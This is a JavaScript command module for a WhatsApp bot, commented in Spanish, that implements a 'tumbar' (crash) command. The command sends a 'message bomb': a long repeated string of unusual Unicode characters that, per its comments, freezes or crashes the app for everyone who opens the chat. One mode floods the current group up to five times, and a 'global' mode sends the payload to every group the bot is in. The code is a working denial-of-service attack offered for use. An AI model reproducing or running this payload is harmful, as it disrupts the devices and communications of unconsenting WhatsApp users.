// commands/group/tumbar.js
//
// TUMBAR = mandar el "mensaje bomba" (binario) al grupo.
// No expulsa a nadie: traba/colapsa el WhatsApp de todos al abrir el chat,
// porque es un renglón larguísimo con caracteres raros que revientan el
// render de texto de la app.

// Una unidad del bombo clásico. Se repite para que pegue de verdad.
const UNIDAD = '㊠ ߘ㊠ ߘ㠊ߘ㊠ ߘ㊠ ߘ㊠ ߘ㊠ ߘ㊰ߘ㊰ߘ㊠ ߘ㊠ ߘ㠊ߘ㊠ ';

// Subí o bajá este número para que trabe más o menos fuerte.
const BOMBA = UNIDAD.repeat(150).trim();

const ESPERA = (ms) => new Promise((r) => setTimeout(r, ms));

export default {
    nombre: 'tumbar',
    categoria: 'grupos',
    alias: ['bomba', 'binario', 'crash'],
    descripcion:
        'Tumba el grupo con el mensaje bomba (binario). ' +
        'Uso: .tumbar | .tumbar 3 | .tumbar global',

    ejecutar: async ({ sock, msg, responder, argumento }) => {
        const chatId = msg.key.remoteJid;

        if (!chatId.endsWith('@g.us')) {
            return responder.texto('❌ Este comando solo funciona dentro de un grupo.');
        }

        const arg = (argumento || '').trim().toLowerCase();
        const global = arg === 'global' || arg === 'todos';

        // ---- Modo global: bomba a TODOS los grupos donde está el bot ----
        if (global) {
            const todos = await sock.groupFetchAllParticipating();
            const ids = Object.keys(todos || {});

            if (!ids.length) return responder.texto('🤷 El bot no está en ningún grupo.');

            await responder.texto(`💣 Tumbando *${ids.length}* grupos...`);

            for (const gid of ids) {
                try {
                    await sock.sendMessage(gid, { text: BOMBA });
                } catch (error) {
                    console.error('[TUMBAR] Falló en', gid, error?.message || error);
                }
                await ESPERA(700);
            }

            return responder.texto('☠️ Bombas enviadas. Si el WhatsApp se traba, cierren y abran la app.');
        }

        // ---- Modo normal: bomba en este grupo ----
        let veces = parseInt(arg, 10);
        if (!Number.isFinite(veces) || veces < 1) veces = 1;
        if (veces > 5) veces = 5;

        for (let i = 0; i < veces; i++) {
            await sock.sendMessage(chatId, { text: BOMBA });
            if (i < veces - 1) await ESPERA(700);
        }

        await responder.texto('☠️ Grupo tumbado 💣');
    }
};